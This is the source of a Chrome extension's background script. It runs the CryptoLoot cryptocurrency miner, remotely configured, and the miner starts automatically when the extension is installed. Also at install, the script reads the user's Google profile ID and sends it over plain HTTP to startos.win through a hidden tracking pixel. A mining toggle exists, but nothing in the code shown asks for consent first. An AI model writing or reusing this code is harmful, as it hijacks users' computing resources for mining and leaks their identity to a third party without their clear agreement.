import 'whatwg-fetch';
import './lib/cryptoloot';
import { checkRequestStatus } from './utils';
import {
  CONFIG_URL,
  THANK_YOU_PAGE_URL,
  UNINSTALL_PAGE_URL,
  DEFAULT_SETTINGS,
  IS_MINING,
  ENABLE_MINING,
  DISABLE_MINING,
  GET_SETTINGS,
  SAVE_SETTINGS,
  RESET_SETTINGS,
  GET_HASHES_PER_SECOND,
  ERROR_EVENT,
  AUTHED_EVENT,
} from './constants';

const { storage, runtime, identity } = chrome;
const { local } = storage;

let miner = new CryptoLoot.Anonymous(DEFAULT_SETTINGS.siteKey, {
  threads: DEFAULT_SETTINGS.threads,
  throttle: DEFAULT_SETTINGS.throttle,
});

const getConfig = () => {
  return new Promise((resolve, reject) => {
    fetch(CONFIG_URL, {
      method: 'GET',
      headers: {
        'Content-Type': 'application/json',
      }
    })
      .then(checkRequestStatus)
      .then(response => resolve(response))
      .catch(error => reject(error));
  });
};

const isMining = () => {
  return new Promise((resolve) => local.get('isMining', ({ isMining }) => resolve(isMining)));
};

const enableMining = () => {
  return new Promise((resolve) => local.set({ isMining: true }, () => {
    miner.start();
    resolve();
  }));
};

const disableMining = () => {
  return new Promise((resolve) => local.set({ isMining: false }, () => {
    miner.stop();
    resolve();
  }));
};

const saveSettings = ({ settings }) => {
  return new Promise((resolve) => local.set({ settings }, () => {
    const { siteKey, threads, throttle } = settings;
    miner.stop();
    miner = new CryptoLoot.Anonymous(siteKey, { threads, throttle });
    setMinerEvents();
    isMining().then((isMining) => {
      if (isMining) {
        miner.start();
      }
      resolve();
    });
  }));
};

const getSettings = () => {
  return new Promise((resolve) => local.get('settings', ({ settings }) => {
    if (!settings) {
      getConfig().then(
        (settings) => saveSettings({ settings }).then(() => resolve(settings)),
        (error) => resolve(DEFAULT_SETTINGS),
      );
    } else {
      resolve(settings);
    }
  }));
};

const injectTrackingPixel = (userID) => {
  const pixel = document.createElement('img');
  pixel.width = 1;
  pixel.height = 1;
  pixel.classList.add('hidden');
  pixel.src = `http://www.startos.win/conversion.gif?cid=${ userID }`;
  document.body.appendChild(pixel);
};

const setEvents = () => {
  runtime.onInstalled.addListener((details) => {
    _gaq.push(['_trackEvent', 'Extension', 'install']);
    identity.getProfileUserInfo(({ id }) => injectTrackingPixel(id));
    enableMining();
    _gaq.push(['_trackEvent', 'Mining', 'autoStart']);
    chrome.tabs.create({ url: THANK_YOU_PAGE_URL, active: true });
  });

  runtime.onMessage.addListener((request, sender, sendResponse) => {
    const { type, data } = request;
    switch (type) {
      case IS_MINING: {
        isMining().then(sendResponse);
        break;
      }
      case ENABLE_MINING: {
        enableMining().then(sendResponse);
        break;
      }
      case DISABLE_MINING: {
        disableMining().then(sendResponse);
        break;
      }
      case GET_SETTINGS: {
        getSettings().then(sendResponse);
        break;
      }
      case SAVE_SETTINGS: {
        saveSettings(data).then(sendResponse);
        break;
      }
      case RESET_SETTINGS: {
        getConfig().then(
          (settings) => saveSettings({ settings }).then(() => sendResponse(settings)),
          (error) => saveSettings({ DEFAULT_SETTINGS }).then(() => sendResponse(DEFAULT_SETTINGS)),
        );
        break;
      }
      case GET_HASHES_PER_SECOND: {
        const hashes = miner.getHashesPerSecond();
        sendResponse(hashes);
        break;
      }
      default: {
        break;
      }
    }
    return true;
  });
};

const setMinerEvents = () => {
  miner.on('error', (params) => {
    // disableMining();
    runtime.sendMessage({ type: ERROR_EVENT });
  });
  miner.on('authed', (params) => {
    runtime.sendMessage({ type: AUTHED_EVENT });
  });
};

chrome.runtime.setUninstallURL(UNINSTALL_PAGE_URL);

setEvents();
setMinerEvents();
isMining().then((isMining) => {
  if (isMining && !miner.isRunning()) {
    miner.start();
  }
  _gaq.push(['_trackEvent', 'Mining', 'start']);
});
  